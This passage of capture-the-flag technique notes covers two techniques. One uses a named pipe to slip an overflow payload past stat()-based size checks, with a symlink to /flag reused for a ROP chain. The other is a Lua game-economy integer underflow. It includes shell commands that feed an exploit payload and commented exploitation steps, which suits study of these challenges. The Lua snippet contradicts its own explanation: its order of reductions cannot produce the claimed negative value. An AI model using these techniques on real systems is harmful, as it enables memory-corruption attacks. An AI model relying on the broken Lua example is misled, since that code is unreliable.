**Pattern:** Binary reads a file and checks its size before processing. Named pipes (FIFOs) report `st_size = 0` via `stat()` but deliver arbitrary data when read, bypassing size-based overflow prevention.

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data
./vulnerable_binary /tmp/payload_pipe
```

Combine with symlinks for string reuse: `ln -s /flag arena.c` uses an existing string in the binary as the target filename for a ROP chain.

**Key insight:** Named pipes always report `st_size = 0` in `stat()`, bypassing any size-based buffer allocation or bounds checks while delivering arbitrary-length data via `read()`. Any binary that uses `stat()` to pre-allocate or validate before `read()` is vulnerable.

**References:** Nuit du Hack 2016

---

### Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)

**Pattern:** Text-based game (written in Lua) with inventory management. Two independent percentage reductions are applied sequentially to the same value without capping the combined result: a 100% decay applied first zeros the inventory, then a 10% penalty applied to the already-zero value causes an integer underflow below zero. Selling the underflowed items generates unlimited money (the game treats a large negative count as a large positive sale value or wraps to unsigned max).

**Vulnerable logic:**
```lua
-- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed

-- If applied in the other order, or combined:
-- 100% decay → inventory = 0
-- 10% of 0 = 0 → total reduction = 100%, no underflow

-- But with uncapped sequential application:
-- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
-- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
-- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**Exploitation:**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**Key insight:** Business logic bugs in game economies create integer underflows without any memory corruption — two uncapped percentage reductions exceeding 100% underflow the target variable. Look for any game mechanic that applies multiple independent percentage modifications to the same integer value in the same tick.

**References:** ASIS CTF Finals 2017

